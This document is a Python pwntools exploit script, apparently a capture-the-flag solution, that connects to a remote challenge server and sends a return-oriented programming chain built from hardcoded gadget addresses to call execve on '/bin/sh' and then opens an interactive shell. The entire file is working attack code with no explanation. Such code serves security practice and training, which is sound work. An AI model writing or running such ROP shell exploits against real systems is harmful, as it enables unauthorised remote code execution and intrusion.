import pwn
from pwn import *

elf = ELF('./static')
pwn.context.binary = elf
#libc = elf.libc
#s = elf.process()
s = remote('static.chal.cyberjousting.com', 1350)

#pwn.gdb.attach(s)


gadget_rsi_to_rdi = 0x4707d4  
ret_gadget = 0x40f571        
pop_rax_gadget = 0x41069c    
pop_rsi_gadget = 0x4062d8    
pop_rdx_gadget = 0x42d9c2 
pop_rdx_rbx = 0x000000000045e467

syscall_gadget = 0x0000000000401194 

payload = b'/bin/sh\x00' + b'\x00' * 10
payload += p64(gadget_rsi_to_rdi)          
payload += p64(ret_gadget)
payload += p64(pop_rax_gadget)
payload += p64(59)
payload += p64(pop_rsi_gadget)               
payload += p64(0)                            
payload += p64(pop_rdx_rbx)               
payload += p64(0)           
payload += p64(0)
payload += p64(syscall_gadget)

s.sendline(payload)

s.interactive()